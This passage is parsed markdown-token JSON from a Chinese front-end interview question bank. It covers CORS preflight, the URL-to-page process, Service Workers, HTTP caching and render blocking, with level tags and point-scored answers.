\\n"},{"type":"text","raw":"预检请求的目的是检查服务器是否允许来自不同源（域、协议或端口）的请求进行某些操作。这样做可以确保客户端在发送实际请求之前，先得到服务器的明确许可。","text":"预检请求的目的是检查服务器是否允许来自不同源（域、协议或端口）的请求进行某些操作。这样做可以确保客户端在发送实际请求之前，先得到服务器的明确许可。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 从输入URL到看到页面发生的全过程？\\n\\n","depth":2,"text":"从输入URL到看到页面发生的全过程？","tokens":[{"type":"text","raw":"从输入URL到看到页面发生的全过程？","text":"从输入URL到看到页面发生的全过程？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- 1.用户首先在浏览器地址栏中输入想要访问的网站的URL。\\n- 2.浏览器内部代码会解析这个URL。它首先会检查本地hosts文件，看是否有对应的域名。如果有，浏览器就会直接向该IP地址发送请求。如果没有，浏览器会将域名发送给DNS服务器进行解析，将域名转换成对应的服务器IP地址。\\n- 3.浏览器通过HTTP协议向服务器发送请求。HTTP协议是一种应用层协议，用于在客户端和服务器之间传输数据。浏览器会根据URL中的路径和参数构建HTTP请求，并发送给服务器。\\n- 4.服务器接收到请求后，会根据请求的内容进行处理，并返回相应的HTTP响应。响应中包含了服务器返回的数据，如HTML、CSS、JavaScript等资源文件，以及状态码等信息。\\n- 5.浏览器接收到服务器返回的响应后，会解析响应中的数据，并开始渲染页面。浏览器会根据HTML文件中的标签和属性，将页面元素渲染出来。同时，浏览器还会下载并解析CSS和JavaScript文件，以实现页面的样式和交互功能。\\n- 6.当页面加载完成后，浏览器会触发DOMContentLoaded事件，通知页面已经加载完成。此时，页面中的JavaScript代码可以开始执行，实现页面的交互功能。\\n- 7.如果页面中还有异步请求（如Ajax请求），浏览器会继续发送这些请求，并等待服务器返回响应。当这些请求完成后，浏览器会更新页面中的相应部分，以反映最新的数据。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 1.用户首先在浏览器地址栏中输入想要访问的网站的URL。\\n","task":false,"loose":false,"text":"1.用户首先在浏览器地址栏中输入想要访问的网站的URL。","tokens":[{"type":"text","raw":"1.用户首先在浏览器地址栏中输入想要访问的网站的URL。","text":"1.用户首先在浏览器地址栏中输入想要访问的网站的URL。","tokens":[{"type":"text","raw":"1.用户首先在浏览器地址栏中输入想要访问的网站的URL。","text":"1.用户首先在浏览器地址栏中输入想要访问的网站的URL。","escaped":false}]}]},{"type":"list_item","raw":"- 2.浏览器内部代码会解析这个URL。它首先会检查本地hosts文件，看是否有对应的域名。如果有，浏览器就会直接向该IP地址发送请求。如果没有，浏览器会将域名发送给DNS服务器进行解析，将域名转换成对应的服务器IP地址。\\n","task":false,"loose":false,"text":"2.浏览器内部代码会解析这个URL。它首先会检查本地hosts文件，看是否有对应的域名。如果有，浏览器就会直接向该IP地址发送请求。如果没有，浏览器会将域名发送给DNS服务器进行解析，将域名转换成对应的服务器IP地址。","tokens":[{"type":"text","raw":"2.浏览器内部代码会解析这个URL。它首先会检查本地hosts文件，看是否有对应的域名。如果有，浏览器就会直接向该IP地址发送请求。如果没有，浏览器会将域名发送给DNS服务器进行解析，将域名转换成对应的服务器IP地址。","text":"2.浏览器内部代码会解析这个URL。它首先会检查本地hosts文件，看是否有对应的域名。如果有，浏览器就会直接向该IP地址发送请求。如果没有，浏览器会将域名发送给DNS服务器进行解析，将域名转换成对应的服务器IP地址。","tokens":[{"type":"text","raw":"2.浏览器内部代码会解析这个URL。它首先会检查本地hosts文件，看是否有对应的域名。如果有，浏览器就会直接向该IP地址发送请求。如果没有，浏览器会将域名发送给DNS服务器进行解析，将域名转换成对应的服务器IP地址。","text":"2.浏览器内部代码会解析这个URL。它首先会检查本地hosts文件，看是否有对应的域名。如果有，浏览器就会直接向该IP地址发送请求。如果没有，浏览器会将域名发送给DNS服务器进行解析，将域名转换成对应的服务器IP地址。","escaped":false}]}]},{"type":"list_item","raw":"- 3.浏览器通过HTTP协议向服务器发送请求。HTTP协议是一种应用层协议，用于在客户端和服务器之间传输数据。浏览器会根据URL中的路径和参数构建HTTP请求，并发送给服务器。\\n","task":false,"loose":false,"text":"3.浏览器通过HTTP协议向服务器发送请求。HTTP协议是一种应用层协议，用于在客户端和服务器之间传输数据。浏览器会根据URL中的路径和参数构建HTTP请求，并发送给服务器。","tokens":[{"type":"text","raw":"3.浏览器通过HTTP协议向服务器发送请求。HTTP协议是一种应用层协议，用于在客户端和服务器之间传输数据。浏览器会根据URL中的路径和参数构建HTTP请求，并发送给服务器。","text":"3.浏览器通过HTTP协议向服务器发送请求。HTTP协议是一种应用层协议，用于在客户端和服务器之间传输数据。浏览器会根据URL中的路径和参数构建HTTP请求，并发送给服务器。","tokens":[{"type":"text","raw":"3.浏览器通过HTTP协议向服务器发送请求。HTTP协议是一种应用层协议，用于在客户端和服务器之间传输数据。浏览器会根据URL中的路径和参数构建HTTP请求，并发送给服务器。","text":"3.浏览器通过HTTP协议向服务器发送请求。HTTP协议是一种应用层协议，用于在客户端和服务器之间传输数据。浏览器会根据URL中的路径和参数构建HTTP请求，并发送给服务器。","escaped":false}]}]},{"type":"list_item","raw":"- 4.服务器接收到请求后，会根据请求的内容进行处理，并返回相应的HTTP响应。响应中包含了服务器返回的数据，如HTML、CSS、JavaScript等资源文件，以及状态码等信息。\\n","task":false,"loose":false,"text":"4.服务器接收到请求后，会根据请求的内容进行处理，并返回相应的HTTP响应。响应中包含了服务器返回的数据，如HTML、CSS、JavaScript等资源文件，以及状态码等信息。","tokens":[{"type":"text","raw":"4.服务器接收到请求后，会根据请求的内容进行处理，并返回相应的HTTP响应。响应中包含了服务器返回的数据，如HTML、CSS、JavaScript等资源文件，以及状态码等信息。","text":"4.服务器接收到请求后，会根据请求的内容进行处理，并返回相应的HTTP响应。响应中包含了服务器返回的数据，如HTML、CSS、JavaScript等资源文件，以及状态码等信息。","tokens":[{"type":"text","raw":"4.服务器接收到请求后，会根据请求的内容进行处理，并返回相应的HTTP响应。响应中包含了服务器返回的数据，如HTML、CSS、JavaScript等资源文件，以及状态码等信息。","text":"4.服务器接收到请求后，会根据请求的内容进行处理，并返回相应的HTTP响应。响应中包含了服务器返回的数据，如HTML、CSS、JavaScript等资源文件，以及状态码等信息。","escaped":false}]}]},{"type":"list_item","raw":"- 5.浏览器接收到服务器返回的响应后，会解析响应中的数据，并开始渲染页面。浏览器会根据HTML文件中的标签和属性，将页面元素渲染出来。同时，浏览器还会下载并解析CSS和JavaScript文件，以实现页面的样式和交互功能。\\n","task":false,"loose":false,"text":"5.浏览器接收到服务器返回的响应后，会解析响应中的数据，并开始渲染页面。浏览器会根据HTML文件中的标签和属性，将页面元素渲染出来。同时，浏览器还会下载并解析CSS和JavaScript文件，以实现页面的样式和交互功能。","tokens":[{"type":"text","raw":"5.浏览器接收到服务器返回的响应后，会解析响应中的数据，并开始渲染页面。浏览器会根据HTML文件中的标签和属性，将页面元素渲染出来。同时，浏览器还会下载并解析CSS和JavaScript文件，以实现页面的样式和交互功能。","text":"5.浏览器接收到服务器返回的响应后，会解析响应中的数据，并开始渲染页面。浏览器会根据HTML文件中的标签和属性，将页面元素渲染出来。同时，浏览器还会下载并解析CSS和JavaScript文件，以实现页面的样式和交互功能。","tokens":[{"type":"text","raw":"5.浏览器接收到服务器返回的响应后，会解析响应中的数据，并开始渲染页面。浏览器会根据HTML文件中的标签和属性，将页面元素渲染出来。同时，浏览器还会下载并解析CSS和JavaScript文件，以实现页面的样式和交互功能。","text":"5.浏览器接收到服务器返回的响应后，会解析响应中的数据，并开始渲染页面。浏览器会根据HTML文件中的标签和属性，将页面元素渲染出来。同时，浏览器还会下载并解析CSS和JavaScript文件，以实现页面的样式和交互功能。","escaped":false}]}]},{"type":"list_item","raw":"- 6.当页面加载完成后，浏览器会触发DOMContentLoaded事件，通知页面已经加载完成。此时，页面中的JavaScript代码可以开始执行，实现页面的交互功能。\\n","task":false,"loose":false,"text":"6.当页面加载完成后，浏览器会触发DOMContentLoaded事件，通知页面已经加载完成。此时，页面中的JavaScript代码可以开始执行，实现页面的交互功能。","tokens":[{"type":"text","raw":"6.当页面加载完成后，浏览器会触发DOMContentLoaded事件，通知页面已经加载完成。此时，页面中的JavaScript代码可以开始执行，实现页面的交互功能。","text":"6.当页面加载完成后，浏览器会触发DOMContentLoaded事件，通知页面已经加载完成。此时，页面中的JavaScript代码可以开始执行，实现页面的交互功能。","tokens":[{"type":"text","raw":"6.当页面加载完成后，浏览器会触发DOMContentLoaded事件，通知页面已经加载完成。此时，页面中的JavaScript代码可以开始执行，实现页面的交互功能。","text":"6.当页面加载完成后，浏览器会触发DOMContentLoaded事件，通知页面已经加载完成。此时，页面中的JavaScript代码可以开始执行，实现页面的交互功能。","escaped":false}]}]},{"type":"list_item","raw":"- 7.如果页面中还有异步请求（如Ajax请求），浏览器会继续发送这些请求，并等待服务器返回响应。当这些请求完成后，浏览器会更新页面中的相应部分，以反映最新的数据。","task":false,"loose":false,"text":"7.如果页面中还有异步请求（如Ajax请求），浏览器会继续发送这些请求，并等待服务器返回响应。当这些请求完成后，浏览器会更新页面中的相应部分，以反映最新的数据。","tokens":[{"type":"text","raw":"7.如果页面中还有异步请求（如Ajax请求），浏览器会继续发送这些请求，并等待服务器返回响应。当这些请求完成后，浏览器会更新页面中的相应部分，以反映最新的数据。","text":"7.如果页面中还有异步请求（如Ajax请求），浏览器会继续发送这些请求，并等待服务器返回响应。当这些请求完成后，浏览器会更新页面中的相应部分，以反映最新的数据。","tokens":[{"type":"text","raw":"7.如果页面中还有异步请求（如Ajax请求），浏览器会继续发送这些请求，并等待服务器返回响应。当这些请求完成后，浏览器会更新页面中的相应部分，以反映最新的数据。","text":"7.如果页面中还有异步请求（如Ajax请求），浏览器会继续发送这些请求，并等待服务器返回响应。当这些请求完成后，浏览器会更新页面中的相应部分，以反映最新的数据。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 对Service Worker的理解\\n\\n","depth":2,"text":"对Service Worker的理解","tokens":[{"type":"text","raw":"对Service Worker的理解","text":"对Service Worker的理解","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **1：** Service Worker 是运行在浏览器背后的独立线程，一般可以用来实现缓存功能。\\n- **4：**\\n  + 首先需要先注册 Service Worker，然后监听到 install 事件以后就可以缓存需要的文件\\n  + 那么在下次用户访问的时候就可以通过拦截请求的方式查询是否存在缓存\\n  + 存在缓存的话就可以直接读取缓存文件，否则就去请求数据。\\n  + 打开页面，可以在开发者工具中的 Application 看到 Service Worker 已经启动了,在Cache中也可以发现所需的文件已被缓存","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** Service Worker 是运行在浏览器背后的独立线程，一般可以用来实现缓存功能。\\n","task":false,"loose":false,"text":"**1：** Service Worker 是运行在浏览器背后的独立线程，一般可以用来实现缓存功能。","tokens":[{"type":"text","raw":"**1：** Service Worker 是运行在浏览器背后的独立线程，一般可以用来实现缓存功能。","text":"**1：** Service Worker 是运行在浏览器背后的独立线程，一般可以用来实现缓存功能。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Service Worker 是运行在浏览器背后的独立线程，一般可以用来实现缓存功能。","text":" Service Worker 是运行在浏览器背后的独立线程，一般可以用来实现缓存功能。","escaped":false}]}]},{"type":"list_item","raw":"- **4：**\\n  + 首先需要先注册 Service Worker，然后监听到 install 事件以后就可以缓存需要的文件\\n  + 那么在下次用户访问的时候就可以通过拦截请求的方式查询是否存在缓存\\n  + 存在缓存的话就可以直接读取缓存文件，否则就去请求数据。\\n  + 打开页面，可以在开发者工具中的 Application 看到 Service Worker 已经启动了,在Cache中也可以发现所需的文件已被缓存","task":false,"loose":false,"text":"**4：**\\n+ 首先需要先注册 Service Worker，然后监听到 install 事件以后就可以缓存需要的文件\\n+ 那么在下次用户访问的时候就可以通过拦截请求的方式查询是否存在缓存\\n+ 存在缓存的话就可以直接读取缓存文件，否则就去请求数据。\\n+ 打开页面，可以在开发者工具中的 Application 看到 Service Worker 已经启动了,在Cache中也可以发现所需的文件已被缓存","tokens":[{"type":"text","raw":"**4：**\\n","text":"**4：**","tokens":[{"type":"strong","raw":"**4：**","text":"4：","tokens":[{"type":"text","raw":"4：","text":"4：","escaped":false}]}]},{"type":"list","raw":"+ 首先需要先注册 Service Worker，然后监听到 install 事件以后就可以缓存需要的文件\\n+ 那么在下次用户访问的时候就可以通过拦截请求的方式查询是否存在缓存\\n+ 存在缓存的话就可以直接读取缓存文件，否则就去请求数据。\\n+ 打开页面，可以在开发者工具中的 Application 看到 Service Worker 已经启动了,在Cache中也可以发现所需的文件已被缓存","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 首先需要先注册 Service Worker，然后监听到 install 事件以后就可以缓存需要的文件\\n","task":false,"loose":false,"text":"首先需要先注册 Service Worker，然后监听到 install 事件以后就可以缓存需要的文件","tokens":[{"type":"text","raw":"首先需要先注册 Service Worker，然后监听到 install 事件以后就可以缓存需要的文件","text":"首先需要先注册 Service Worker，然后监听到 install 事件以后就可以缓存需要的文件","tokens":[{"type":"text","raw":"首先需要先注册 Service Worker，然后监听到 install 事件以后就可以缓存需要的文件","text":"首先需要先注册 Service Worker，然后监听到 install 事件以后就可以缓存需要的文件","escaped":false}]}]},{"type":"list_item","raw":"+ 那么在下次用户访问的时候就可以通过拦截请求的方式查询是否存在缓存\\n","task":false,"loose":false,"text":"那么在下次用户访问的时候就可以通过拦截请求的方式查询是否存在缓存","tokens":[{"type":"text","raw":"那么在下次用户访问的时候就可以通过拦截请求的方式查询是否存在缓存","text":"那么在下次用户访问的时候就可以通过拦截请求的方式查询是否存在缓存","tokens":[{"type":"text","raw":"那么在下次用户访问的时候就可以通过拦截请求的方式查询是否存在缓存","text":"那么在下次用户访问的时候就可以通过拦截请求的方式查询是否存在缓存","escaped":false}]}]},{"type":"list_item","raw":"+ 存在缓存的话就可以直接读取缓存文件，否则就去请求数据。\\n","task":false,"loose":false,"text":"存在缓存的话就可以直接读取缓存文件，否则就去请求数据。","tokens":[{"type":"text","raw":"存在缓存的话就可以直接读取缓存文件，否则就去请求数据。","text":"存在缓存的话就可以直接读取缓存文件，否则就去请求数据。","tokens":[{"type":"text","raw":"存在缓存的话就可以直接读取缓存文件，否则就去请求数据。","text":"存在缓存的话就可以直接读取缓存文件，否则就去请求数据。","escaped":false}]}]},{"type":"list_item","raw":"+ 打开页面，可以在开发者工具中的 Application 看到 Service Worker 已经启动了,在Cache中也可以发现所需的文件已被缓存","task":false,"loose":false,"text":"打开页面，可以在开发者工具中的 Application 看到 Service Worker 已经启动了,在Cache中也可以发现所需的文件已被缓存","tokens":[{"type":"text","raw":"打开页面，可以在开发者工具中的 Application 看到 Service Worker 已经启动了,在Cache中也可以发现所需的文件已被缓存","text":"打开页面，可以在开发者工具中的 Application 看到 Service Worker 已经启动了,在Cache中也可以发现所需的文件已被缓存","tokens":[{"type":"text","raw":"打开页面，可以在开发者工具中的 Application 看到 Service Worker 已经启动了,在Cache中也可以发现所需的文件已被缓存","text":"打开页面，可以在开发者工具中的 Application 看到 Service Worker 已经启动了,在Cache中也可以发现所需的文件已被缓存","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 协商缓存和强缓存的区别\\n\\n","depth":2,"text":"协商缓存和强缓存的区别","tokens":[{"type":"text","raw":"协商缓存和强缓存的区别","text":"协商缓存和强缓存的区别","escaped":false}]},{"type":"heading","raw":"#### 类型：`业务`\\n\\n","depth":4,"text":"类型：`业务`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`业务`","text":"业务"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **2：** 强缓存\\n  + 使用强缓存策略时，如果缓存资源有效，则直接使用缓存资源，不必再向服务器发起请求。\\n  + 设置方式：分别是 http 响应头信息中的 Expires 属性和 Cache-Control 属性。\\n- **2：** 协商缓存\\n  + 如果命中强制缓存，就无需发起新的请求，直接使用缓存资源，如果没有命中强制缓存，且设置了协商缓存，这个时候协商缓存就会发挥作用了。\\n  + 设置方式：分别是 http请求头中if-modified-since和if-none-match 响应 头信息中的 Etag 和 Last-Modified 属性。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 强缓存\\n  + 使用强缓存策略时，如果缓存资源有效，则直接使用缓存资源，不必再向服务器发起请求。\\n  + 设置方式：分别是 http 响应头信息中的 Expires 属性和 Cache-Control 属性。\\n","task":false,"loose":false,"text":"**2：** 强缓存\\n+ 使用强缓存策略时，如果缓存资源有效，则直接使用缓存资源，不必再向服务器发起请求。\\n+ 设置方式：分别是 http 响应头信息中的 Expires 属性和 Cache-Control 属性。","tokens":[{"type":"text","raw":"**2：** 强缓存\\n","text":"**2：** 强缓存","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 强缓存","text":" 强缓存","escaped":false}]},{"type":"list","raw":"+ 使用强缓存策略时，如果缓存资源有效，则直接使用缓存资源，不必再向服务器发起请求。\\n+ 设置方式：分别是 http 响应头信息中的 Expires 属性和 Cache-Control 属性。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用强缓存策略时，如果缓存资源有效，则直接使用缓存资源，不必再向服务器发起请求。\\n","task":false,"loose":false,"text":"使用强缓存策略时，如果缓存资源有效，则直接使用缓存资源，不必再向服务器发起请求。","tokens":[{"type":"text","raw":"使用强缓存策略时，如果缓存资源有效，则直接使用缓存资源，不必再向服务器发起请求。","text":"使用强缓存策略时，如果缓存资源有效，则直接使用缓存资源，不必再向服务器发起请求。","tokens":[{"type":"text","raw":"使用强缓存策略时，如果缓存资源有效，则直接使用缓存资源，不必再向服务器发起请求。","text":"使用强缓存策略时，如果缓存资源有效，则直接使用缓存资源，不必再向服务器发起请求。","escaped":false}]}]},{"type":"list_item","raw":"+ 设置方式：分别是 http 响应头信息中的 Expires 属性和 Cache-Control 属性。","task":false,"loose":false,"text":"设置方式：分别是 http 响应头信息中的 Expires 属性和 Cache-Control 属性。","tokens":[{"type":"text","raw":"设置方式：分别是 http 响应头信息中的 Expires 属性和 Cache-Control 属性。","text":"设置方式：分别是 http 响应头信息中的 Expires 属性和 Cache-Control 属性。","tokens":[{"type":"text","raw":"设置方式：分别是 http 响应头信息中的 Expires 属性和 Cache-Control 属性。","text":"设置方式：分别是 http 响应头信息中的 Expires 属性和 Cache-Control 属性。","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **2：** 协商缓存\\n  + 如果命中强制缓存，就无需发起新的请求，直接使用缓存资源，如果没有命中强制缓存，且设置了协商缓存，这个时候协商缓存就会发挥作用了。\\n  + 设置方式：分别是 http请求头中if-modified-since和if-none-match 响应 头信息中的 Etag 和 Last-Modified 属性。","task":false,"loose":false,"text":"**2：** 协商缓存\\n+ 如果命中强制缓存，就无需发起新的请求，直接使用缓存资源，如果没有命中强制缓存，且设置了协商缓存，这个时候协商缓存就会发挥作用了。\\n+ 设置方式：分别是 http请求头中if-modified-since和if-none-match 响应 头信息中的 Etag 和 Last-Modified 属性。","tokens":[{"type":"text","raw":"**2：** 协商缓存\\n","text":"**2：** 协商缓存","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 协商缓存","text":" 协商缓存","escaped":false}]},{"type":"list","raw":"+ 如果命中强制缓存，就无需发起新的请求，直接使用缓存资源，如果没有命中强制缓存，且设置了协商缓存，这个时候协商缓存就会发挥作用了。\\n+ 设置方式：分别是 http请求头中if-modified-since和if-none-match 响应 头信息中的 Etag 和 Last-Modified 属性。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 如果命中强制缓存，就无需发起新的请求，直接使用缓存资源，如果没有命中强制缓存，且设置了协商缓存，这个时候协商缓存就会发挥作用了。\\n","task":false,"loose":false,"text":"如果命中强制缓存，就无需发起新的请求，直接使用缓存资源，如果没有命中强制缓存，且设置了协商缓存，这个时候协商缓存就会发挥作用了。","tokens":[{"type":"text","raw":"如果命中强制缓存，就无需发起新的请求，直接使用缓存资源，如果没有命中强制缓存，且设置了协商缓存，这个时候协商缓存就会发挥作用了。","text":"如果命中强制缓存，就无需发起新的请求，直接使用缓存资源，如果没有命中强制缓存，且设置了协商缓存，这个时候协商缓存就会发挥作用了。","tokens":[{"type":"text","raw":"如果命中强制缓存，就无需发起新的请求，直接使用缓存资源，如果没有命中强制缓存，且设置了协商缓存，这个时候协商缓存就会发挥作用了。","text":"如果命中强制缓存，就无需发起新的请求，直接使用缓存资源，如果没有命中强制缓存，且设置了协商缓存，这个时候协商缓存就会发挥作用了。","escaped":false}]}]},{"type":"list_item","raw":"+ 设置方式：分别是 http请求头中if-modified-since和if-none-match 响应 头信息中的 Etag 和 Last-Modified 属性。","task":false,"loose":false,"text":"设置方式：分别是 http请求头中if-modified-since和if-none-match 响应 头信息中的 Etag 和 Last-Modified 属性。","tokens":[{"type":"text","raw":"设置方式：分别是 http请求头中if-modified-since和if-none-match 响应 头信息中的 Etag 和 Last-Modified 属性。","text":"设置方式：分别是 http请求头中if-modified-since和if-none-match 响应 头信息中的 Etag 和 Last-Modified 属性。","tokens":[{"type":"text","raw":"设置方式：分别是 http请求头中if-modified-since和if-none-match 响应 头信息中的 Etag 和 Last-Modified 属性。","text":"设置方式：分别是 http请求头中if-modified-since和if-none-match 响应 头信息中的 Etag 和 Last-Modified 属性。","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 什么情况会阻塞渲染\\n\\n","depth":2,"text":"什么情况会阻塞渲染","tokens":[{"type":"text","raw":"什么情况会阻塞渲染","text":"什么情况会阻塞渲染","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **1：** 首先渲染的前提是生成渲染树，所以 HTML 和 CSS 肯定会阻塞渲染。\\n\\n- **4：**\\n  + 当浏览器在解析到 script 标签时，会暂停构建 DOM，完成后才会从暂停的地方重新开始。\\n  + 如果你想首屏渲染的越快，就越不应该在首屏就加载 JS 文件，这也是都建议将 script 标签放在 body 标签底部的原因。\\n  + script 标签加上 defer 属性以后，表示该 JS 文件会并行下载，但是会放到 HTML 解析完成后顺序执行，所以对于这种情况你可以把 script 标签放在任意位置。\\n  + 对于没有任何依赖的 JS 文件可以加上 async 属性，表示 JS 文件下载和解析不会阻塞渲染。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** 首先渲染的前提是生成渲染树，所以 HTML 和 CSS 肯定会阻塞渲染。\\n\\n","task":false,"loose":true,"text":"**1：** 首先渲染的前提是生成渲染树，所以 HTML 和 CSS 肯定会阻塞渲染。\\n","tokens":[{"type":"text","raw":"**1：** 首先渲染的前提是生成渲染树，所以 HTML 和 CSS 肯定会阻塞渲染。\\n","text":"**1：** 首先渲染的前提是生成渲染树，所以 HTML 和 CSS 肯定会阻塞渲染。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 首先渲染的前提是生成渲染树，所以 HTML 和 CSS 肯定会阻塞渲染。","text":" 首先渲染的前提是生成渲染树，所以 HTML 和 CSS 肯定会阻塞渲染。","escaped":false}]}]},{"type":"list_item","raw":"- **4：**\\n  + 当浏览器在解析到 script 标签时，会暂停构建 DOM，完成后才会从暂停的地方重新开始。\\n  + 如果你想首屏渲染的越快，就越不应该在首屏就加载 JS 文件，这也是都建议将 script 标签放在 body 标签底部的原因。\\n  + script 标签加上 defer 属性以后，表示该 JS 文件会并行下载，但是会放到 HTML 解析完成后顺序执行，所以对于这种情况你可以把 script 标签放在任意位置。\\n  + 对于没有任何依赖的 JS 文件可以加上 async 属性，表示 JS 文件下载和解析不会阻塞渲染。","task":false,"loose":true,"text":"**4：**\\n+ 当浏览器在解析到 script 标签时，会暂停构建 DOM，完成后才会从暂停的地方重新开始。\\n+ 如果你想首屏渲染的越快，就越不应该在首屏就加载 JS 文件，这也是都建议将 script 标签放在 body 标签底部的原因。\\n+ script 标签加上 defer 属性以后，表示该 JS 文件会并行下载，但是会放到 HTML 解析完成后顺序执行，所以对于这种情况你可以把 script 标签放在任意位置。\\n+ 对于没有任何依赖的 JS 文件可以加上 async 属性，表示 JS 文件下载和解析不会阻塞渲染。","tokens":[{"type":"text","raw":"**4：**\\n","text":"**4：**","tokens":[{"type":"strong","raw":"**4：**","text":"4：","tokens":[{"type":"text","raw":"4：","text":"4：","escaped":false}]}]},{"type":"list","raw":"+ 当浏览器在解析到 script 标签时，会暂停构建 DOM，完成后才会从暂停的地方重新开始。\\n+ 如果你想首屏渲染的越快，就越不应该在首屏就加载 JS 文件，这也是都建议将 script 标签放在 body 标签底部的原因。\\n+ script 标签加上 defer 属性以后，表示该 JS 文件会并行下载，但是会放到 HTML 解析完成后顺序执行，所以对于这种情况你可以把 script 标签放在任意位置。\\n+ 对于没有任何依赖的 JS 文件可以加上 async 属性，表示 JS 文件下载和解析不会阻塞渲染。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 当浏览器在解析到 script 标签时，会暂停构建 DOM，完成后才会从暂停的地方重新开始。\\n","task":false,"loose":false,"text":"当浏览器在解析到 script 标签时，会暂停构建 DOM，完成后才会从暂停的地方重新开始。","tokens":[{"type":"text","raw":"当浏览器在解析到 script 标签时，会暂停构建 DOM，完成后才会从暂停的地方重新开始。","text":"当浏览器在解析到 script 标签时，会暂停构建 DOM，完成后才会从暂停的地方重新开始。","tokens":[{"type":"text","raw":"当浏览器在解析到 script 标签时，会暂停构建 DOM，完成后才会从暂停的地方重新开始。","text":"当浏览器在解析到 script 标签时，会暂停构建 